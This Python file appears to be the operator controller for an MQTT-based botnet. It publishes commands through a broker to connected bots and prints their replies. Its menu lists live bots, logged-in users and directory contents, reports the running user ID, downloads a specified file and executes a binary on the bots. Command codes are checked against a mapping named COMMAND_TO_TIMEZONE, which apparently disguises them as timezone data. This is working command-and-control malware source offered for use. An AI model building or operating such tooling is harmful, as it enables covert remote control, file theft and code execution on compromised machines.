from paho.mqtt import client as mqtt
from datetime import datetime
from zoneinfo import ZoneInfo
from common import *
import threading
import random
import time

response_lock = threading.Lock()
bot_responses: list[BotMessage] = []

def on_connect(client, userdata, flags, reason_code, properties):
    # reason_code - connection result code. 0 - success, otherwise failure.
    if reason_code == 0:
        print("Connected to MQTT Broker.")
        client.subscribe(MQTT_TOPIC)
        print(f"Subscribed to topic: {MQTT_TOPIC}.")
    else:
        print(f"Failed to connect, connection return code {reason_code}.")
        client.disconnect()
        exit(1)


def on_message(client, userdata, msg):
    try:
        payload = msg.payload.decode()
        request_msg = RequestMessage.from_json(payload)

        try:
            data = BotMessage.from_request(request_msg)
            print(f"Deserialized payload: {request_msg}")
            with response_lock:
                bot_responses.append(data)
        except Exception:
            raise UnknownDeviceError()

    except UnicodeDecodeError:
        pass  # Ignore messages from unknown devices
    except UnknownDeviceError:
        pass  # Ignore messages from unknown devices
    except Exception as ex:
        print(f"Error processing message {ex.__class__.__name__}: {ex}")


def timezone_date_time(timezone: str):
    now_utc = datetime.now(timezone.utc)
    try:
        return now_utc.astimezone(ZoneInfo(timezone))
    except Exception:
        # ignore error, return anything
        return now_utc


def publish_action_request(client: mqtt.Client, user_action: int, path: str = None):
    response = RequestMessage()

    response.set_user_action(user_action)
    response.set_message(path)

    with response_lock:
        bot_responses.clear()

    client.publish(MQTT_TOPIC, response.to_json())


def wait_for_responses(timeout=5):
    print(f"Waiting {timeout} seconds for bot responses...")
    time.sleep(timeout)
    with response_lock:
        print(f"\nBot responses ({len(bot_responses)}):")
        for response in bot_responses:
            print(f"\t- {response.device_id}: {response.message}")


def user_actions(client: mqtt.Client):
    retry = True
    while retry:
        try:
            print("Actions:")
            print(f'\t[{CMD_LIST_BOTS}] List alive bots.')
            print(f'\t[{CMD_LIST_USERS}] List logged in users.')
            print(f'\t[{CMD_LIST_DIR}] List content of specified directory.')
            print(f'\t[{CMD_GET_USER_ID}] Print ID of user running the bot.')
            print(f'\t[{CMD_DOWNLOAD_FILE}] Download specified file.')
            print(f'\t[{CMD_EXECUTE_BINARY}] Execute a binary.')
            print("\t[Q] Quit.")

            action = input("Select action: ").strip()

            path = None
            if action in [str(CMD_LIST_DIR), str(CMD_DOWNLOAD_FILE), str(CMD_EXECUTE_BINARY)]:
                path = input("Enter path: ").strip()
                if not path:
                    print("Path cannot be empty.")
                    continue

            if action.upper() == "Q":
                print("Quitting...")
                retry = False

            timeout = 30
            timeout_str = input("Set timeout (seconds) [Default 30s]: ").strip()
            if timeout_str.isdigit() and int(timeout_str):
                timeout = int(timeout_str)

            if action.isdigit() and int(action) in COMMAND_TO_TIMEZONE:
                publish_action_request(client, int(action), path)
                wait_for_responses(timeout)
            else:
                print("Invalid action selected.")
                retry = True

        except KeyboardInterrupt:
            print("Quitting...")
            retry = False
        except Exception as ex:
            print(f"An error occurred during action selection: {ex}")
            retry = True


def main():
    # create MQTT client
    client_id = f"Controller{random.randint(1, 10000)}"
    client = mqtt.Client(mqtt.CallbackAPIVersion.VERSION2, client_id)

    client.on_connect = on_connect
    client.on_message = on_message

    client.connect(MQTT_BROKER, MQTT_PORT)

    try:
        client.loop_start()
        user_actions(client)
    except Exception as ex:
        print(f"An error occurred: {ex}")
    finally:
        client.loop_stop()
        client.disconnect()


if __name__ == "__main__":
    main()
